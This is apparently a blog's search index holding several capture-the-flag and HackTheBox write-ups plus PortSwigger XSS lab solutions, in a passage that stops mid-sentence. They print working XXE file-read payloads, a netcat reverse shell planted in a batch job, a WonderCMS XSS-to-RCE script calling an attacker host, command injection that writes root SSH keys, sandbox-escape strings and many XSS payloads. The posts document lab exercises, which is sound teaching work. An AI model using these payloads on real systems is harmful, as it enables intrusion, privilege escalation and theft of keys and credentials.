OpenSSL/1.1.1c PHP/7.2.28 443/tcp open ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28) |_http-title: MegaShopping | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 Let\u0026rsquo;s fuzz directories\nFrom (http://markup.htb/webalizer) we got the version of Apache that is 2.4.41. Moreover, there is a signin form on homepage.\nWhen I tried some default creds, it worked! admin:password. After login, when we go to Contact tab, we will see login form on service.php.\nLet\u0026rsquo;s try to submit the form and intercept the request in burpsuite!\nUser Flag It\u0026rsquo;s XML request, let\u0026rsquo;s try to do XML Injection. If we see the source code from service.php file, we will see this comment \u0026lt;!-- Modified by Daniel : UI-Fix-9092--\u0026gt;. Meaning, there is a user named as Daniel in the system, we will try to get it\u0026rsquo;s id_rsa from account and get the shell as we can see SSH port is enabled.\n1 \u0026lt;?xml version = \u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE replace [\u0026lt;!ENTITY ent SYSTEM \u0026#34;file:///C:/Users/daniel/.ssh/id_rsa\u0026#34;\u0026gt; ]\u0026gt;\u0026lt;order\u0026gt;\u0026lt;quantity\u0026gt;1\u0026lt;/quantity\u0026gt;\u0026lt;item\u0026gt;\u0026amp;ent;\u0026lt;/item\u0026gt;\u0026lt;address\u0026gt;test\u0026lt;/address\u0026gt;\u0026lt;/order\u0026gt; Make a file named as id_rsa and change it\u0026rsquo;s permission to 400 using chmod 400 id_rsa and then login with ssh ssh -i id_rsa daniel@markup.htb. We will get our user flag in Daniel\u0026rsquo;s desktop folder.\nFlag: 032d2fc8952a8c24e39c8f0ee9918ef7\nRoot Flag If we go to Log-Managementfolder, we will find job.bat file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 daniel@MARKUP C:\\Log-Management\u0026gt;type job.bat @echo off FOR /F \u0026#34;tokens=1,2*\u0026#34; %%V IN (\u0026#39;bcdedit\u0026#39;) DO SET adminTest=%%V IF (%adminTest%)==(Access) goto noAdmin for /F \u0026#34;tokens=*\u0026#34; %%G in (\u0026#39;wevtutil.exe el\u0026#39;) DO (call :do_clear \u0026#34;%%G\u0026#34;) echo. echo Event Logs have been cleared! goto theEnd :do_clear wevtutil.exe cl %1 goto :eof :noAdmin echo You must run this script as an Administrator! :theEnd exit If we look at this file\u0026rsquo;s permission, we will see BUILTIN\\Users:(I)(RX) and BUILTIN\\Users:(F), which means user has full control over this file. Let\u0026rsquo;s download nc64.exe and append to this file, so every time when this file gets executed we will get the shell.\nDownload nc from https://github.com/int0x33/nc.exe/blob/master/nc64.exe\nTo add the shell inot job.bat we will use\necho C:\\Log-Management\\nc.exe -e cmd.exe 10.10.14.243 4444 \u0026gt; C:\\Log-Management\\job.bat\nAfter a sec, we will get the reverse shell as system. Flag: f574a3e7650cebd8c39784299cb570f8\n","description":"Walkthrough of the \"Markup\" machine on HackTheBox, featuring enumeration, XML external entity (XXE) injection to gain a user shell, and privilege escalation via writable batch script to SYSTEM.","id":4,"section":"posts","tags":["HackTheBox","htb-markup","nmap","xxe","winbox","xml-injection","apache","php","ssh","privilege-escalation","batch-replacement","reverse-shell"],"title":"HackTheBox Writeup - Markup Room","uri":"https://g4nd1v.github.io/posts/hackthebox-markup/"},{"content":"Sea Title Sea Description Detailed walkthrough of the Sea room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags. Difficulty Easy Maker FisMatHack Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 └─$ cat nmap/tcp_default.nmap # Nmap 7.95 scan initiated Sun May 18 16:49:14 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.11.28 Nmap scan report for sea.htb (10.10.11.28) Host is up (0.086s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA) | 256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA) |_ 256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: GET POST OPTIONS | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel So from the Nmap, we can see there are 2 ports running, ssh and http. The first thing I have tried was to visit the website, but there is nothing in website except the contact form.\nBut this page is not giving anything, no SSRF, or XSS. Also, it seems the website is written in PHP as it is having contact.php page. Next, on fuzzing the directory I have found themes/ directory and from that directory, I got the theme name, license and version of the theme.\nNext, I googled about the theme name and it\u0026rsquo;s version, I have found it\u0026rsquo;s WonderCMS and there is exploit available for this - https://www.exploit-db.com/exploits/52271\nUser Flag We can use this exploit (https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413).\nIt takes 3 arguments: URL: where WonderCMS is installed (no need to know the password) IP: attacker\u0026rsquo;s Machine IP Port No: attacker\u0026rsquo;s Machine PORT\nChanging the script from the original exploit. changed pathname to hostname downloaded main.zip from https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip to locally. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 # Exploit: WonderCMS XSS to RCE import sys import requests import os import bs4 if (len(sys.argv)\u0026lt;4): print(\u0026#34;usage: python3 exploit.py loginURL IP_Address Port\\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252\u0026#34;) else: data = \u0026#39;\u0026#39;\u0026#39; var url = \u0026#34;\u0026#39;\u0026#39;\u0026#39;+str(sys.argv[1])+\u0026#39;\u0026#39;\u0026#39;\u0026#34;; if (url.endsWith(\u0026#34;/\u0026#34;)) { url = url.slice(0, -1); } var urlWithoutLog = url.split(\u0026#34;/\u0026#34;).slice(0, -1).join(\u0026#34;/\u0026#34;); var urlWithoutLogBase = new URL(urlWithoutLog).hostname; var token = document.querySelectorAll(\u0026#39;[name=\u0026#34;token\u0026#34;]\u0026#39;)[0].value; var urlRev = urlWithoutLogBase+\u0026#34;/?installModule=http://10.10.14.16:8000/main.zip\u0026amp;directoryName=violet\u0026amp;type=themes\u0026amp;token=\u0026#34; + token; var xhr3 = new XMLHttpRequest(); xhr3.withCredentials = true; xhr3.open(\u0026#34;GET\u0026#34;, urlRev); xhr3.send(); xhr3.onload = function() { if (xhr3.status == 200) { var xhr4 = new XMLHttpRequest(); xhr4.withCredentials = true; xhr4.open(\u0026#34;GET\u0026#34;, urlWithoutLogBase+\u0026#34;/themes/revshell-main/rev.php\u0026#34;); xhr4.send(); xhr4.onload = function() { if (xhr4.status == 200) { var ip = \u0026#34;\u0026#39;\u0026#39;\u0026#39;+str(sys.argv[2])+\u0026#39;\u0026#39;\u0026#39;\u0026#34;; var port = \u0026#34;\u0026#39;\u0026#39;\u0026#39;+str(sys.argv[3])+\u0026#39;\u0026#39;\u0026#39;\u0026#34;; var xhr5 = new XMLHttpRequest(); xhr5.withCredentials = true; xhr5.open(\u0026#34;GET\u0026#34;, urlWithoutLogBase+\u0026#34;/themes/revshell-main/rev.php?lhost=\u0026#34; + ip + \u0026#34;\u0026amp;lport=\u0026#34; + port); xhr5.send(); } }; } }; \u0026#39;\u0026#39;\u0026#39; try: open(\u0026#34;xss.js\u0026#34;,\u0026#34;w\u0026#34;).write(data) print(\u0026#34;[+] xss.js is created\u0026#34;) print(\u0026#34;[+] execute the below command in another terminal\\n\\n----------------------------\\nnc -lvp \u0026#34;+str(sys.argv[3])) print(\u0026#34;----------------------------\\n\u0026#34;) XSSlink = str(sys.argv[1]).replace(\u0026#34;loginURL\u0026#34;,\u0026#34;index.php?page=loginURL?\u0026#34;)+\u0026#34;\\\u0026#34;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;script+src=\\\u0026#34;http://\u0026#34;+str(sys.argv[2])+\u0026#34;:8000/xss.js\\\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;form+action=\\\u0026#34;\u0026#34; XSSlink = XSSlink.strip(\u0026#34; \u0026#34;) print(\u0026#34;send the below link to admin:\\n\\n----------------------------\\n\u0026#34;+XSSlink) print(\u0026#34;----------------------------\\n\u0026#34;) print(\u0026#34;\\nstarting HTTP server to allow the access to xss.js\u0026#34;) os.system(\u0026#34;python3 -m http.server\\n\u0026#34;) except: print(data,\u0026#34;\\n\u0026#34;,\u0026#34;//write this to a file\u0026#34;) It generates an xss.js file (for reflected XSS) and outputs a malicious link.\nAs soon as the admin (logged user) opens/clicks the malicious link, a few background requests are made without admin acknowledgement to upload a shell via the upload theme/plugin functionality.\nAfter uploading the shell, it executes the shell and the attacker gets the reverse connection of the server. As the shell is uploaded on this path, on visiting this path we will get the shell: curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.16\u0026amp;\u0026amp;lport=4444'\nIf we go to /var/www/sea/data folder, we will database.js file and in that file we will get password.\nRemoving that \\ from the password we will get $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q and we can crack the password using john.\nPassword is: mychemicalromance\nNow, if we check the home directory in our rev shell, we can see we have 2 users. That is, amay and geo. Let\u0026rsquo;s try to use this password in ssh with this usernames.\nWe got user shell using, User Pass amay mychemicalromance User Flag: 54970052ef7c36482285d18e365f7f71\nRoot Flag After we got our user, I have downloaded linpeas and ran it in ssh shell.\nIn Active ports tab, we can see there is an unusual port 8080 that is open, let\u0026rsquo;s see what is hosted on that port - ssh -L 8080:localhost:8080 amay@sea.htb. On visiting the website, it will ask for username and password, as of now we only have one! Let\u0026rsquo;s try that\nAnd it worked!\nIt seems we can able to see the logs, maybe log poisoning or LFI? Let\u0026rsquo;s see!\nAfter trying certain payload, I can verify it is having command injection vulnerability.\nIf we send this payload log_file=;id+#\u0026amp;analyze_log= we will get command injection. Let\u0026rsquo;s get the keys from root using this technique.\nIf we use this payload log_file=;ls+/root/.ssh/+#\u0026amp;analyze_log= we can see there is authorized_key in response.\nWhat I will do is, generate a keypair locally and the upload the key to authorized key and we will login using private key.\nTo upload the key using curl: log_file=;curl+http://10.10.14.16:8000/key.pub+\u0026gt;\u0026gt;/root/.ssh/authorized_keys+#\u0026amp;analyze_log= Next login to root using ssh using the key we have generated: ssh -i key root@sea.htb Root Flag: 3df2005ae45ed6ab5cf74f83b6f68416\n","description":"Detailed walkthrough of the Sea room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":5,"section":"posts","tags":["HackTheBox","htb-sea","feroxbuster","wondercms","cve-2023-41425","xss","reverse-shell","hashcat","file-read","command-injection","linpeas","ssh","tunneling","privilege-escalation"],"title":"HackTHeBox Writeup - Sea Room","uri":"https://g4nd1v.github.io/posts/hackthebox-sea/"},{"content":"web/when the sunk cost fallacy\nhttps://when.atreides.b01lersc.tf/\nWriteup To get the flag in this CTF challenge, we need to send a POST request to the /gamble endpoint with a specific Date header that results in the server generating a SHA-256 hash starting with two 0xFF bytes. Here\u0026rsquo;s how you can do it:\nUnderstanding the Vulnerability: The server uses the Date header from the request to generate a Unix timestamp. This timestamp is hashed using SHA-256, and if the first two bytes of the hash are 0xFF 0xFF, the flag is returned. Controlled Input: Since the Date header is user-controlled, you can brute-force a timestamp that produces the required hash. Brute-Force the Timestamp: Find a timestamp (integer) such that when converted to a string and hashed with SHA-256, the hash starts with 0xFF 0xFF. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const crypto = require(\u0026#39;crypto\u0026#39;); // Function to find a valid timestamp where SHA-256 starts with 0xFF 0xFF function findValidTimestamp() { let n = 0; while (true) { const str = n.toString(); const hash = crypto.createHash(\u0026#39;sha256\u0026#39;).update(str).digest(); if (hash[0] === 0xFF \u0026amp;\u0026amp; hash[1] === 0xFF) { return n; } n++; } } const validN = findValidTimestamp(); const date = new Date(validN * 1000); const dateHeader = date.toUTCString(); console.log(`Found valid timestamp: ${validN}`); console.log(`Set Date header to: \u0026#34;${dateHeader}\u0026#34;`); The result says,\nFound valid timestamp: 30398\rSet Date header to: \u0026#34;Thu, 01 Jan 1970 08:26:38 GMT\u0026#34; Use CURL to send the request\ncurl -X POST https://when.atreides.b01lersc.tf/gamble -H \u0026#34;date: Thu, 01 Jan 1970 08:26:38 GMT\u0026#34; Flag bctf{ninety_nine_percent_of_gamblers_gamble_81dc9bdb}\nrev/class-struggle I miss the good old days before OOP, when we lived in a classless, stateless society\u0026hellip;\nWriteup To solve this CTF challenge, we need to reverse-engineer the given obfuscated C code to determine the correct input (flag) that passes the validation check. The code applies several transformations to the input string and compares it against a predefined byte array. Our task is to reverse these transformations to retrieve the flag.\nUnderstand the Obfuscated Code: The code uses macros to disguise the actual operations. By expanding these macros, we can see that the code performs XOR, bitwise rotations, and arithmetic operations on each character of the input. Identify Key Transformations: The transformations applied to each character include XOR with a position-dependent value, left rotation, addition of a constant, another XOR, and a right rotation. Reverse the Transformations: To find the original flag, we need to reverse each transformation step in the opposite order. This involves right rotating instead of left rotating, subtracting constants, and XORing with the same values. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 def rotate_left(val, n): n = n % 8 return ((val \u0026lt;\u0026lt; n) | (val \u0026gt;\u0026gt; (8 - n))) \u0026amp; 0xff def rotate_right(val, n): n = n % 8 return ((val \u0026gt;\u0026gt; n) | (val \u0026lt;\u0026lt; (8 - n))) \u0026amp; 0xff encrypted = [ 0x32, 0xc0, 0xbf, 0x6c, 0x61, 0x85, 0x5c, 0xe4, 0x40, 0xd0, 0x8f, 0xa2, 0xef, 0x7c, 0x4a, 0x02, 0x04, 0x9f, 0x37, 0x18, 0x68, 0x97, 0x39, 0x33, 0xbe, 0xf1, 0x20, 0xf1, 0x40, 0x83, 0x06, 0x7e, 0xf1, 0x46, 0xa6, 0x47, 0xfe, 0xc3, 0xc8, 0x67, 0x04, 0x4d, 0xba, 0x10, 0x9b, 0x33 ] flag = [] for i in range(len(encrypted)): e = encrypted[i] rot = i % 8 trans4 = rotate_left(e, rot) trans3 = trans4 ^ 0x0F trans2 = (trans3 - 42) % 256 rot_amount = (i + 3) % 7 trans1 = rotate_right(trans2, rot_amount) input_char = trans1 ^ (i * 37) % 256 flag.append(chr(input_char)) print(\u0026#39;\u0026#39;.join(flag)) Rotate Left/Right Functions: These functions handle the bitwise rotations needed to reverse the transformations applied during encryption. Reversing Steps: Rotate Left: For each encrypted byte, rotate left by i % 8 to undo the final right rotation. XOR with 0x0F: This reverses the XOR applied during encryption. Subtract 42: This undoes the addition of 42 during encryption. Rotate Right: Rotate right by (i + 3) % 7 to reverse the initial left rotation. XOR with Position-Dependent Value: Finally, XOR with i * 37 to retrieve the original character. Flag bctf{seizing_the_m3m3s_0f_pr0ducti0n_32187ea8}\nweb/trouble at the spa I had this million-dollar app idea the other day, but I can\u0026rsquo;t get my routing to work! I\u0026rsquo;m only using state-of-the-art tools and frameworks, so that can\u0026rsquo;t be the problem\u0026hellip; right? Can you navigate me to the endpoint of my dreams?\nhttps://ky28060.github.io/\nWriteup We have a NextJS application with these routes.\n\u0026lt;BrowserRouter\u0026gt;\r\u0026lt;Routes\u0026gt;\r\u0026lt;Route index element={\u0026lt;App /\u0026gt;} /\u0026gt;\r\u0026lt;Route path=\u0026#34;/flag\u0026#34; element={\u0026lt;Flag /\u0026gt;} /\u0026gt;\r\u0026lt;/Routes\u0026gt;\r\u0026lt;/BrowserRouter\u0026gt; On visiting /flag route, it does not seem to exists on GitHub pages.\nI have tried multiple things like\nsearching from source code - reading JS files, but it seems to be obfuscated. I tried to deobfuscate it with python code manually, but did not get anything out of it. Next, I went to the repo - as the website is hosted on github pages, we can able to see the source code of the website using this link: https://github.com/ky28060/ky28060.github.io. I tried to find the flag from this file, but got no luck. Next, I have tried to check the documentation of \u0026lt;BrowserRouter\u0026gt;. It says \u0026lt;Router\u0026gt; that uses the HTML5 history API (pushState, replaceState and the popstate event) to keep your UI in sync with the URL. Then I have asked ChatGPT to give me vanilla JS code that I might be able to execute in the console of browser. Here is the thread you check I have asked.\nhttps://chatgpt.com/share/6803ea66-8764-8006-8106-8b58bf952538\nSo, from the thread with chatgpt, we can use history.pushState({}, '', '/flag'); - It updates the URL without reloading the page. dispatchEvent(new PopStateEvent('popstate', { state: history.state })); -\u0026gt; popstate is triggered on browser navigation (back/forward). Flag bctf{r3wr1t1ng_h1st0ry_1b07a3768fc}\n","description":"My writeups for b01lers CTF 2025 - b01lers CTF is a CTF hosted by Purdue University's b01lers CTF team.","id":6,"section":"posts","tags":["CTF"],"title":"b01lers CTF 2025 writeups","uri":"https://g4nd1v.github.io/posts/ctf-b01lersc-2025/"},{"content":" Title hackdonalds Description Find the FLAG and win Intigriti swag! 🏆 Difficulty Easy Maker Bastien + CryptoCat Solution I was browsing web application and then I have checked all the endpoints in buildManifest file.\n1 \u0026#34;/\u0026#34;:[\u0026#34;static/chunks/pages/index-962b18549cc4f828.js\u0026#34;],\u0026#34;/_error\u0026#34;:[\u0026#34;static/chunks/pages/_error-8353112a01355ec2.js\u0026#34;],\u0026#34;/admin\u0026#34;:[\u0026#34;static/chunks/pages/admin-6c2dae3cae78011c.js\u0026#34;],\u0026#34;/ice-cream-detail/[id]\u0026#34;:[\u0026#34;static/chunks/pages/ice-cream-detail/[id]-b32c99038b6ec0fd.js\u0026#34;],\u0026#34;/ice-cream-machines\u0026#34;:[\u0026#34;static/chunks/pages/ice-cream-machines-b24176f8afd36ccb.js\u0026#34;],\u0026#34;/login\u0026#34;:[\u0026#34;static/chunks/pages/login-bbb35bf68527fb05.js\u0026#34;],\u0026#34;/menu\u0026#34;:[\u0026#34;static/chunks/pages/menu-52c4263910fef849.js\u0026#34;],sortedPages:[\u0026#34;/\u0026#34;,\u0026#34;/_app\u0026#34;,\u0026#34;/_error\u0026#34;,\u0026#34;/admin\u0026#34;,\u0026#34;/ice-cream-detail/[id]\u0026#34;,\u0026#34;/ice-cream-machines\u0026#34;,\u0026#34;/login\u0026#34;,\u0026#34;/menu\u0026#34;] There is a /admin page. Upon visiting this page, I am redirected to /login page. But NextJS we have CVE-2025-29927 which will bypass the authentication. Let\u0026rsquo;s try to add X-Middleware-Subrequest: middleware ad middleware and then send the request.\nWe can see admin dashboard now! Upon hovering on all the links, we can see ice cream machine is the only link that is working. This is how ice cream machines tab will look like.\nWhen we view settings and then check \u0026ldquo;parse settings\u0026rdquo;, we will see the website is using XML in request, so let\u0026rsquo;s try to do XML Injection to view /etc/passwd. The payload will be\n\u0026lt;?xml version=\\\u0026#34;1.0\\\u0026#34; encoding=\\\u0026#34;UTF-8\\\u0026#34;?\u0026gt;\u0026lt;!DOCTYPE root [\u0026lt;!ENTITY test SYSTEM \u0026#39;file:///etc/passwd\u0026#39;\u0026gt;]\u0026gt;\\n\u0026lt;machine\u0026gt;\\n \u0026lt;id\u0026gt;\u0026amp;test;\u0026lt;/id\u0026gt;\\n \u0026lt;name\u0026gt;Ice Cream Machine\u0026lt;/name\u0026gt;\\n \u0026lt;temperature\u0026gt;-18\u0026lt;/temperature\u0026gt;\\n \u0026lt;mixLevel\u0026gt;75\u0026lt;/mixLevel\u0026gt;\\n \u0026lt;lastMaintenance\u0026gt;2025-03-15\u0026lt;/lastMaintenance\u0026gt;\\n \u0026lt;cleaningSchedule\u0026gt;Daily\u0026lt;/cleaningSchedule\u0026gt;\\n\u0026lt;/machine\u0026gt; In modern NextJS application, all the files will be in app/ folder, so we will look at package.json file://app/package.json and we will get our flag!\nFlag INTIGRITI{XXE_1n_Ic3Cr34m_M4ch1n3s}\n","description":"Detailed walkthrough of the hackdonalds challenge on Intigriti platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.","id":7,"section":"posts","tags":["CTF"],"title":"Intigriti Writeup - hackdonalds challenge","uri":"https://g4nd1v.github.io/posts/ctf-hackdonalds/"},{"content":"Cookie Crackdown Description We\u0026rsquo;re auditing some websites to check if they\u0026rsquo;re GDPR compliant, and I\u0026rsquo;m pretty sure this site isn\u0026rsquo;t\u0026hellip;\nWriteup When we visit the website, and when we open the devtools, we will see the flag in Cookie tab.\nFlag MetaCTF{n0nc0ns3nsu4l_c00ki3_cr4ckd0wn}\nbetter_eval() Description I just want to let people run python code, but they keep trying to read flag.txt. So, I made a better eval that has filters to stop this!\nDownload the code here and connect to the remote instance with nc kubenode.mctf.io 30019\nIn the event that remote instance goes down, you can also use nc host5.metaproblems.com 5110. These two are identical, this is just the backup.\nWriteup When we see the source code, we will see it the website is using eval but there are certain filters.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #!/usr/local/bin/python def better_eval(untrusted_code): blocked_terms = [\u0026#34;flag\u0026#34;, \u0026#34;+\u0026#34;, \u0026#34;import\u0026#34;, \u0026#34;os\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;exec\u0026#34;] for term in blocked_terms: if term in untrusted_code: print(f\u0026#34;The term {term} is filtered!\u0026#34;) return try: # Execute the user input in the restricted environment without globals or locals print(eval(untrusted_code)) except Exception as e: print(f\u0026#34;Error: {e}\u0026#34;) while True: untrusted_code = input(\u0026#34;Enter your python code\u0026gt; \u0026#34;) better_eval(untrusted_code) Here are the payload we can test to bypass python sandbox: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html\nFor example, if we want to read /etc/passwd file, we can use open(\u0026quot;/etc/passwd\u0026quot;).read()\nBut, if you try to read flag.txt, you will get error, because flag is blocked word.\nSimilar to flag, exec, +, import and others are also blocked. So what can we do? Oh boy, there are multiple solutions.\nUsing format string - open(\u0026quot;{0}{1}{2}{3}.txt\u0026quot;.format('f','l','a','g')).read() Convert to ascii - open(''.join([chr(102),chr(108),chr(97),chr(103),'.','t','x','t'])).read() encoding/decoding and so on\u0026hellip;\nFlag MetaCTF{f1l73rs_d0_n0t_s3cur3_u}\nTill Delete Do Us Part Description I was messing with trying to dual boot, and while trying to fix partitions, I accidentally deleted the one on my wedding flash drive I carelessly had plugged in! Please help me recover it!\nDownload the artifact here.\nWriteup The file contains usb.img file. We can use testdisk to view file testdisk usb.img.\nSelect usb.img \u0026gt; Proceed Select Intel \u0026gt; Analyse \u0026gt; Quick Search \u0026gt; Press P to read the files \u0026gt; Press a to select all files \u0026gt; Press C to copy the selected files\nUse C to paste to destination location and when we check our local file structure, we will see all the content\nThere are nested directories in CTF. We can use find utility: find . -type d -printf '%P\\n' | tr -d '/' | tr -d '\\n'\nwe will get {n0t_ev3n_d3l3t10n_c4n_s3part3_u5} Flag MetaCTF{n0t_ev3n_d3l3t10n_c4n_s3part3_u5}\n","description":"This blog will contain all the writeups for MetaCTF 2025","id":8,"section":"posts","tags":["CTF"],"title":"MetaCTF 2025 CTF","uri":"https://g4nd1v.github.io/posts/ctf-metactf-25/"},{"content":"1. Lab: Reflected XSS into HTML context with nothing encoded This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function.\nUse generic payload to alert \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(\u0026quot;g4nd1v\u0026quot;)\u0026lt;/script\u0026gt; in search functionality.\n2. Lab: Stored XSS into HTML context with nothing encoded This lab contains a stored cross-site scripting vulnerability in the comment functionality.\nTo solve this lab, submit a comment that calls the alert function when the blog post is viewed.\nThere is a stored XSS present in the comment section, so let\u0026rsquo;s comment with generic XSS payload and then visit the website, and see if the payload is getting executed. Payload \u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert('g4nd1v')\u0026lt;/script\u0026gt;\nAnd when we visit the blog again, we will see the XSS is getting executed!\n3. Lab: DOM XSS in document.write sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.\nWell if we can see the source after searching, this is the JS code.\nIt is using location.search to get the parameter and then adding the image with query using document.write. So if we escape the quote and write our payload, it will give us alert.\nSolution: '\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n4. Lab: DOM XSS in document.write sink using source location.search inside a select element This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.\nTo solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.\nIf we see the source of webpage, we will see it is using storeId parameter from URL. So we have to add that to our URL, now what payload do we use?\nFrom the image we can see it is using document.write and inside that it is using \u0026lt;option\u0026gt; tag. Now in order to make our XSS work, we have to close option tag and then call script alert.\nSolution: ?productId=2\u0026amp;storeId=\u0026lt;/option\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\n5. Lab: DOM XSS in innerHTML sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search.\nTo solve this lab, perform a cross-site scripting attack that calls the alert function.\nLet\u0026rsquo;s see the source code.\nWe can see website is using innerHTML. The innerHTML sink doesn\u0026rsquo;t accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements.\nSolution: \u0026quot;\u0026gt;\u0026lt;img src=x onerror=alert(1)\u0026gt;\n6. Lab: Reflected XSS into HTML context with all tags blocked except custom ones This lab blocks all HTML tags except custom ones.\nTo solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.\nIn this lab, if we try to use common HTML tags, it will give us tag not allowed response.\nSo, in order to use the custom tags, we can reference cheatsheet provided by portswigger - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet. We can use custom tag like \u0026lt;custom-tag\u0026gt;, \u0026lt;xss\u0026gt; or it can be anything. But the 3 important thing in custom tag is the id, tabindex and #x. id is used to reference the tag, onfocus is used to call alert function when the element is focused. But how can we focus to the tag? Using tabindex. Yes, we have to make the custom tag tag indexable and using #x we can call that index and make it focus and it will call alert function. It is complicated but if we understand HTML tags underneath how it works, then it is fairly simple!\nPayload: \u0026lt;xss id=x onfocus=alert(document.cookie) tabindex=1\u0026gt;#x\nIn order to solve the lab, we have to exploit server and paste this in body.\n1 \u0026lt;script\u0026gt; location = \u0026#39;https://0a63009503c3633b80cd760f00f500e6.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x\u0026#39;; \u0026lt;/script\u0026gt; Solution: \u0026lt;xss id=x onfocus=alert(document.cookie) tabindex=1\u0026gt;#x\n7. Lab: Reflected XSS with event handlers and href attributes blocked This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.\nTo solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.\nNote that you need to label your vector with the word \u0026ldquo;Click\u0026rdquo; in order to induce the simulated lab user to click your vector. For example:\n\u0026lt;a href=\u0026quot;\u0026quot;\u0026gt;Click me\u0026lt;/a\u0026gt;\nAlright, so for this lab, some tags and attributes are not allowed. If you try to use \u0026lt;h1\u0026gt; or \u0026lt;script\u0026gt; it will give us tags not allowed. Moreover, some attributes are also not allowed. In the challenge it says we have to use Click me with \u0026lt;a\u0026gt; tag, so I am guessing \u0026lt;a\u0026gt; is allowed. After fuzzing some inputs, I have found out that \u0026lt;animate\u0026gt; is also allowed. We can simply use similar payload to this - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#svg-animate-tag-using-values\nSo in our payload, we are sure that \u0026lt;a\u0026gt; is allowed, \u0026lt;animate\u0026gt; is also allowed. Moreover, animate tag is a part of \u0026lt;svg\u0026gt; tag, so I am guessing that is also allowed. We have to render text containing click so \u0026lt;text\u0026gt; is also allowed. Now, make a payload based on this.\nSolution: payload - \u0026lt;svg\u0026gt;\u0026lt;a\u0026gt;\u0026lt;animate attributeName=href values=javascript:alert(1) /\u0026gt;\u0026lt;text x=20 y=20\u0026gt;Click\u0026lt;/text\u0026gt;\u0026lt;/a\u0026gt;\n8. Lab: Reflected XSS with some SVG markup allowed This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.\nTo solve the lab, perform a cross-site scripting attack that calls the alert() function.\nIn this challenge, \u0026lt;svg\u0026gt; is allowed, whereas \u0026lt;a\u0026gt; and \u0026lt;animate\u0026gt; is not. From the cheatsheet, I have tried several payload, but none of them work. As animate is not working, I have tried other payload animatemotion, but it didn\u0026rsquo;t work. \u0026lt;animatetransform\u0026gt; did work actually.\nThe first payload itself worked for me: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbegin\nSolution: \u0026lt;svg\u0026gt;\u0026lt;animatetransform onbegin=alert(1) attributeName=transform\u0026gt;\n9. Lab: Reflected XSS into attribute with angle brackets HTML-encoded This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.\nFor this 